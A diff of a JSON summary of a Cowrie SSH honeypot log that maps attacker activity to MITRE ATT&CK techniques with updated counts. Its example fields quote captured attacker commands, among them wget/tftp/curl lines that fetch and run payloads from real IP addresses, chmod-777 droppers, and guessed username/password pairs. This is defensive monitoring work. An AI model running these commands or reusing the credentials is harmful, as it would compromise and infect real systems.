@@ -1,18 +1,18 @@
 {
   "log_file": "/home/cowrie/honeypot/var/log/cowrie/cowrie.json",
-  "generated": "2026-08-29 20:02:47",
+  "generated": "2026-08-29 21:02:47",
   "totals": {
-    "commands": 449,
-    "login_failed": 26147,
-    "login_success": 83,
-    "sessions": 26678
+    "commands": 473,
+    "login_failed": 26421,
+    "login_success": 88,
+    "sessions": 26989
   },
   "techniques": [
     {
       "id": "T1110.001",
       "name": "Brute Force: Password Guessing",
       "tactic": "Credential Access",
-      "count": 26147,
+      "count": 26421,
       "examples": [
         "ubuntu / Abdullah1234@",
         "root / Admin999",
@@ -21,14 +21,14 @@
         "admin / 1q2w3e4r5t"
       ],
       "first": "2026-08-29T00:01:28.806152Z",
-      "last": "2026-08-29T20:02:46.855905Z",
-      "unique_ips": 85
+      "last": "2026-08-29T21:02:27.159038Z",
+      "unique_ips": 89
     },
     {
       "id": "T1222.002",
       "name": "File and Directory Permissions Modification: Linux and Mac",
       "tactic": "Defense Evasion",
-      "count": 154,
+      "count": 155,
       "examples": [
         "/bin/busybox cp /bin/busybox condi72; >condi72; /bin/busybox chmod 777 condi72; /bin/busybox condixx",
         ">/tmp/d && chmod 777 /tmp/d && /tmp/d && cd /tmp/",
@@ -37,14 +37,14 @@
         ">/var/run/d && chmod 777 /var/run/d && /var/run/d && cd /var/run/"
       ],
       "first": "2026-08-29T02:21:36.689252Z",
-      "last": "2026-08-29T18:05:31.013450Z",
-      "unique_ips": 11
+      "last": "2026-08-29T20:58:00.797019Z",
+      "unique_ips": 12
     },
     {
       "id": "T1105",
       "name": "Ingress Tool Transfer",
       "tactic": "Command and Control",
-      "count": 118,
+      "count": 129,
       "examples": [
         "if ! command -v curl &> /dev/null; then apt-get update -y && apt-get install -y curl || yum install -y curl; fi",
         "bash <(curl -sL https://raw.githubusercontent.com/komari-monitor/komari-agent/refs/heads/main/install.sh) -e https://sex",
@@ -53,14 +53,14 @@
         "(tftp -g 185.93.89.72 -r tftp -l- || busybox tftp -g 185.93.89.72 -r tftp -l-) > t; chmod 777 t; ./t; rm -rf t"
       ],
       "first": "2026-08-29T00:23:05.332392Z",
-      "last": "2026-08-29T18:05:31.013450Z",
-      "unique_ips": 12
+      "last": "2026-08-29T20:17:10.312679Z",
+      "unique_ips": 13
     },
     {
       "id": "T1078",
       "name": "Valid Accounts",
       "tactic": "Initial Access",
-      "count": 83,
+      "count": 88,
       "examples": [
         "root / 123@@@",
         "ubuntu / ubuntu",
@@ -69,14 +69,14 @@
         "admin / 12345"
       ],
       "first": "2026-08-29T00:22:29.262232Z",
-      "last": "2026-08-29T19:46:48.066571Z",
-      "unique_ips": 62
+      "last": "2026-08-29T20:57:57.933445Z",
+      "unique_ips": 66
     },
     {
       "id": "T1082",
       "name": "System Information Discovery",
       "tactic": "Discovery",
-      "count": 13,
+      "count": 15,
       "examples": [
         "uname -a",
         "export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH\nuname=$(uname -s -v -n -m 2>/dev/null || ",
@@ -85,14 +85,14 @@
         "#!/bin/bash\nset -e\n\n# ==========================================\n# 1. \u57fa\u7840\u914d\u7f6e\u533a (\u9690\u853d\u4f2a\u88c5\u65b9\u6848)\n# ================================="
       ],
       "first": "2026-08-29T01:00:06.084418Z",
-      "last": "2026-08-29T19:46:48.765073Z",
-      "unique_ips": 12
+      "last": "2026-08-29T20:58:00.797019Z",
+      "unique_ips": 13
     },
     {
       "id": "T1033",
       "name": "System Owner/User Discovery",
       "tactic": "Discovery",
-      "count": 7,
+      "count": 8,
       "examples": [
         "(wget http://185.93.89.72/wget -O- || busybox wget http://185.93.89.72/wget -O-) > w; chmod 777 w; ./w; rm -rf w",
         "export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH\nuname=$(uname -s -v -n -m 2>/dev/null || ",
@@ -100,14 +100,14 @@
         "(wget http://77.90.185.66/wget -O- || busybox wget http://77.90.185.66/wget -O-) > w; chmod 777 w; ./w; rm -rf w"
       ],
       "first": "2026-08-29T03:07:39.054930Z",
-      "last": "2026-08-29T18:04:54.569963Z",
-      "unique_ips": 7
+      "last": "2026-08-29T20:58:00.797019Z",
+      "unique_ips": 8
     },
     {
       "id": "T1059.004",
       "name": "Command and Scripting Interpreter: Unix Shell",
       "tactic": "Execution",
-      "count": 4,
+      "count": 5,
       "examples": [
         "(cd /tmp; wget http://5.182.210.174/ok; curl -O http://5.182.210.174/ok; chmod +x ok; sh ok; rm -rf ok; rm -rf ok.1) >/d",
         "(cd /tmp||cd /var/tmp||cd /dev;rm -rf ok ok.1;busybox wget http://5.182.210.174/ok;wget http://5.182.210.174/ok;/userfs/",
@@ -115,21 +115,21 @@
         "#!/bin/bash\nset -e\n\n# ==========================================\n# 1. \u57fa\u7840\u914d\u7f6e\u533a (\u9690\u853d\u4f2a\u88c5\u65b9\u6848)\n# ================================="
       ],
       "first": "2026-08-29T06:42:19.551602Z",
-      "last": "2026-08-29T16:27:11.494064Z",
-      "unique_ips": 3
+      "last": "2026-08-29T20:58:00.797019Z",
+      "unique_ips": 4
     },
     {
       "id": "T1070.004",
       "name": "Indicator Removal: File Deletion",
       "tactic": "Defense Evasion",
-      "count": 2,
+      "count": 3,
       "examples": [
         "(cd /tmp||cd /var/tmp||cd /dev;rm -rf ok ok.1;busybox wget http://5.182.210.174/ok;wget http://5.182.210.174/ok;/userfs/",
         "export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH\nuname=$(uname -s -v -n -m 2>/dev/null || "
       ],
       "first": "2026-08-29T06:42:19.871645Z",
-      "last": "2026-08-29T09:11:07.444976Z",
-      "unique_ips": 2
+      "last": "2026-08-29T20:58:00.797019Z",
+      "unique_ips": 3
     },
     {
       "id": "T1037",
@@ -207,19 +207,19 @@
   "unmapped": [
     [
       "/bin/busybox",
-      43
+      46
     ],
     [
       "shell",
-      22
+      24
     ],
     [
       "sh",
-      22
+      23
     ],
     [
       "system",
-      20
+      21
     ],
     [
       "echo -e \"\\x47\\x41\\x59\\x46\\x47\\x54\"",
@@ -227,22 +227,22 @@
     ],
     [
       "enable",
-      14
+      15
     ],
     [
       "linuxshell",
-      12
+      13
     ],
     [
       "ping ;sh",
       10
     ],
     [
-      "enablelinuxshell",
-      9
+      "cd /proc && cat self/cmdline",
+      10
     ],
     [
-      "cd /proc && cat self/cmdline",
+      "enablelinuxshell",
       9
     ],
     [
